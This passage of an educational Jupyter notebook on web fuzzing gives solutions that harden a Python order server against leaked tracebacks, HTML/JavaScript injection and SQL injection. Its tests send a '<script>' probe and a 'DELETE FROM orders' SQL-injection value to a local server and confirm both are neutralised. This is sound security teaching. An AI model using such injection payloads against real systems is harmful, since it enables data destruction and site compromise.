    "Create a `BetterHTTPRequestHandler` class that fixes the several issues of `SimpleHTTPRequestHandler`:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 1: Silent Failures\n",
    "\n",
    "Set up the server such that it does not reveal internal information – in particular, tracebacks and HTTP status codes."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We define a better message that does not reveal tracebacks:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 172,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.520678Z",
     "iopub.status.busy": "2021-12-13T14:45:37.520116Z",
     "iopub.status.idle": "2021-12-13T14:45:37.522145Z",
     "shell.execute_reply": "2021-12-13T14:45:37.522529Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "BETTER_HTML_INTERNAL_SERVER_ERROR = \\\n",
    "    HTML_INTERNAL_SERVER_ERROR.replace(\"<pre>{error_message}</pre>\", \"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.526778Z",
     "iopub.status.busy": "2021-12-13T14:45:37.526030Z",
     "iopub.status.idle": "2021-12-13T14:45:37.528800Z",
     "shell.execute_reply": "2021-12-13T14:45:37.529306Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  \n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 173,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(BETTER_HTML_INTERNAL_SERVER_ERROR)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We have the `internal_server_error()` message return `HTTPStatus.OK` to make it harder for machines to find out something went wrong:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.534813Z",
     "iopub.status.busy": "2021-12-13T14:45:37.534288Z",
     "iopub.status.idle": "2021-12-13T14:45:37.535863Z",
     "shell.execute_reply": "2021-12-13T14:45:37.536226Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def internal_server_error(self):\n",
    "        # Note: No INTERNAL_SERVER_ERROR status\n",
    "        self.send_response(HTTPStatus.OK, \"Internal Error\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        exc = traceback.format_exc()\n",
    "        self.log_message(\"%s\", exc.strip())\n",
    "\n",
    "        # No traceback or other information\n",
    "        message = BETTER_HTML_INTERNAL_SERVER_ERROR\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Part 2: Sanitized HTML\n",
    "\n",
    "Set up the server such that it is not vulnerable against HTML and JavaScript injection attacks, notably by using methods such as `html.escape()` to escape special characters when showing them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.539376Z",
     "iopub.status.busy": "2021-12-13T14:45:37.538828Z",
     "iopub.status.idle": "2021-12-13T14:45:37.540446Z",
     "shell.execute_reply": "2021-12-13T14:45:37.540811Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "outputs": [],
   "source": [
    "import html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We pass all values read through `html.escape()` before showing them on the screen; this will properly encode `<`, `&`, and `>` characters."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.545973Z",
     "iopub.status.busy": "2021-12-13T14:45:37.545441Z",
     "iopub.status.idle": "2021-12-13T14:45:37.547018Z",
     "shell.execute_reply": "2021-12-13T14:45:37.547386Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    def send_order_received(self, values):\n",
    "        sanitized_values = {}\n",
    "        for field in values:\n",
    "            sanitized_values[field] = html.escape(values[field])\n",
    "        sanitized_values[\"item_name\"] = html.escape(\n",
    "            FUZZINGBOOK_SWAG[values[\"item\"]])\n",
    "\n",
    "        confirmation = HTML_ORDER_RECEIVED.format(\n",
    "            **sanitized_values).encode(\"utf8\")\n",
    "\n",
    "        self.send_response(HTTPStatus.OK, \"Order received\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(confirmation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 3: Sanitized SQL\n",
    "\n",
    "Set up the server such that it is not vulnerable against SQL injection attacks, notably by using _SQL parameter substitution._"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We use SQL parameter substitution to avoid interpretation of inputs as SQL commands.  Also, we use `execute()` rather than `executescript()` to avoid processing of multiple commands."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.551239Z",
     "iopub.status.busy": "2021-12-13T14:45:37.550730Z",
     "iopub.status.idle": "2021-12-13T14:45:37.552454Z",
     "shell.execute_reply": "2021-12-13T14:45:37.552952Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    def store_order(self, values):\n",
    "        db = sqlite3.connect(ORDERS_DB)\n",
    "        db.execute(\"INSERT INTO orders VALUES (?, ?, ?, ?, ?)\",\n",
    "                (values['item'], values['name'], values['email'], values['city'], values['zip']))\n",
    "        db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "One could also argue not to save \"dangerous\" characters in the first place.  But then, there might always be names or addresses with special characters which all need to be handled."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 4: A Robust Server\n",
    "\n",
    "Set up the server such that it does not crash with invalid or missing fields."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We set up a simple check at the beginning of `handle_order()` that checks whether all required fields are present.  If not, we return to the order form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {
    "cell_style": "split",
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.557637Z",
     "iopub.status.busy": "2021-12-13T14:45:37.557036Z",
     "iopub.status.idle": "2021-12-13T14:45:37.558674Z",
     "shell.execute_reply": "2021-12-13T14:45:37.559044Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    REQUIRED_FIELDS = ['item', 'name', 'email', 'city', 'zip']\n",
    "\n",
    "    def handle_order(self):\n",
    "        values = self.get_field_values()\n",
    "        for required_field in self.REQUIRED_FIELDS:\n",
    "            if required_field not in values:\n",
    "                self.send_order_form()\n",
    "                return\n",
    "\n",
    "        self.store_order(values)\n",
    "        self.send_order_received(values)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "This could easily be extended to check for valid (at least non-empty) values.  Also, the order form should be pre-filled with the originally submitted values, and come with a helpful error message."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 5: Test it!\n",
    "\n",
    "Test your improved server whether your measures have been successful."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.**  Here we go:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.562620Z",
     "iopub.status.busy": "2021-12-13T14:45:37.562048Z",
     "iopub.status.idle": "2021-12-13T14:45:37.577403Z",
     "shell.execute_reply": "2021-12-13T14:45:37.577779Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "httpd_process, httpd_url = start_httpd(BetterHTTPRequestHandler)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 180,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.584603Z",
     "iopub.status.busy": "2021-12-13T14:45:37.583956Z",
     "iopub.status.idle": "2021-12-13T14:45:37.586319Z",
     "shell.execute_reply": "2021-12-13T14:45:37.586944Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "print_url(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 181,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.590507Z",
     "iopub.status.busy": "2021-12-13T14:45:37.589959Z",
     "iopub.status.idle": "2021-12-13T14:45:37.591758Z",
     "shell.execute_reply": "2021-12-13T14:45:37.592213Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test standard behavior:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 182,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.596828Z",
     "iopub.status.busy": "2021-12-13T14:45:37.596210Z",
     "iopub.status.idle": "2021-12-13T14:45:37.610998Z",
     "shell.execute_reply": "2021-12-13T14:45:37.611367Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:37] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 182,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "standard_order = \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + standard_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 183,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.616767Z",
     "iopub.status.busy": "2021-12-13T14:45:37.615564Z",
     "iopub.status.idle": "2021-12-13T14:45:37.617686Z",
     "shell.execute_reply": "2021-12-13T14:45:37.618059Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Thank you\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for incomplete URLs:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.622943Z",
     "iopub.status.busy": "2021-12-13T14:45:37.622082Z",
     "iopub.status.idle": "2021-12-13T14:45:37.630762Z",
     "shell.execute_reply": "2021-12-13T14:45:37.631133Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:37] \"GET /order?item= HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 184,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bad_order = \"/order?item=\"\n",
    "contents = webbrowser(httpd_url + bad_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.634574Z",
     "iopub.status.busy": "2021-12-13T14:45:37.634058Z",
     "iopub.status.idle": "2021-12-13T14:45:37.635588Z",
     "shell.execute_reply": "2021-12-13T14:45:37.636106Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Order Form\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for HTML (and JavaScript) injection:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.639745Z",
     "iopub.status.busy": "2021-12-13T14:45:37.639027Z",
     "iopub.status.idle": "2021-12-13T14:45:37.648346Z",
     "shell.execute_reply": "2021-12-13T14:45:37.648795Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:37] \"GET /order?item=tshirt&name=Jane+Doe%3Cscript%3E%3C%2Fscript%3E&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe&lt;script&gt;&lt;/script&gt; in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 186,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "injection_order = \"/order?item=tshirt&name=Jane+Doe\" + cgi_encode(\"<script></script>\") + \\\n",
    "    \"&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + injection_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 187,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.652547Z",
     "iopub.status.busy": "2021-12-13T14:45:37.652011Z",
     "iopub.status.idle": "2021-12-13T14:45:37.653793Z",
     "shell.execute_reply": "2021-12-13T14:45:37.654197Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Thank you\") > 0\n",
    "assert contents.find(\"<script>\") < 0\n",
    "assert contents.find(\"&lt;script&gt;\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for SQL injection:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 188,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.658309Z",
     "iopub.status.busy": "2021-12-13T14:45:37.657555Z",
     "iopub.status.idle": "2021-12-13T14:45:37.667389Z",
     "shell.execute_reply": "2021-12-13T14:45:37.667844Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:37] \"GET /order?item=tshirt&name=Robert',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Robert&#x27;, &#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;); DELETE FROM orders; -- in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 188,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_order = \"/order?item=tshirt&name=\" + \\\n",
    "    cgi_encode(\"Robert', 'x', 'x', 'x'); DELETE FROM orders; --\") + \\\n",
    "    \"&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + sql_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "(Okay, so obviously we can now handle the weirdest of names; still, Robert should consider changing his name...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 189,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.671643Z",
     "iopub.status.busy": "2021-12-13T14:45:37.671014Z",
     "iopub.status.idle": "2021-12-13T14:45:37.672863Z",
     "shell.execute_reply": "2021-12-13T14:45:37.673229Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"DELETE FROM\") > 0\n",
    "assert not orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "That's it – we're done!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 190,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.676388Z",
     "iopub.status.busy": "2021-12-13T14:45:37.675880Z",
     "iopub.status.idle": "2021-12-13T14:45:37.677675Z",
     "shell.execute_reply": "2021-12-13T14:45:37.678112Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "httpd_process.terminate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 191,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.681372Z",
     "iopub.status.busy": "2021-12-13T14:45:37.680814Z",
     "iopub.status.idle": "2021-12-13T14:45:37.682420Z",
     "shell.execute_reply": "2021-12-13T14:45:37.682787Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "if os.path.exists(ORDERS_DB):\n",
    "    os.remove(ORDERS_DB)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "### Exercise 2: Protect the Server\n",
    "\n",
    "Assume that it is not possible for you to alter the server code.  Create a _filter_ that is run on all URLs before they are passed to the server."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "#### Part 1: A Blacklisting Filter\n",
    "\n",
    "Set up a filter function `blacklist(url)` that returns `False` for URLs that should not reach the server.  Check the URL for whether it contains HTML, JavaScript, or SQL fragments."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "#### Part 2: A Whitelisting Filter\n",
    "\n",
    "Set up a filter function `whitelist(url)` that returns `True` for URLs that are allowed to reach the server.  Check the URL for whether it conforms to expectations; use a [parser](Parser.ipynb) and a dedicated grammar for this purpose."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "### Exercise 3: Input Patterns\n",
    "\n",
    "To fill out forms, fuzzers could be much smarter in how they generate input values.  Starting with HTML 5, input fields can have a `pattern` attribute defining a _regular expression_ that an input value has to satisfy.  A 5-digit ZIP code, for instance, could be defined by the pattern\n",
    "\n",
    "```html\n",
    "<input type=\"text\" pattern=\"[0-9][0-9][0-9][0-9][0-9]\">\n",
    "```\n",
    "\n",
    "Extract such patterns from the HTML page and convert them into equivalent grammar production rules, ensuring that only inputs satisfying the patterns are produced."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader at this point."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "### Exercise 4: Coverage-Driven Web Fuzzing\n",
    "\n",
    "Combine the above fuzzers with [coverage-driven](GrammarCoverageFuzzer.ipynb) and [search-based](SearchBasedFuzzer.ipynb) approaches to maximize feature and code coverage."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader at this point."
   ]
  }
 ],
 "metadata": {
  "ipub": {
   "bibliography": "fuzzingbook.bib",
   "toc": true
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  },
  "toc-autonumbering": false,
  "toc-showmarkdowntxt": false
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
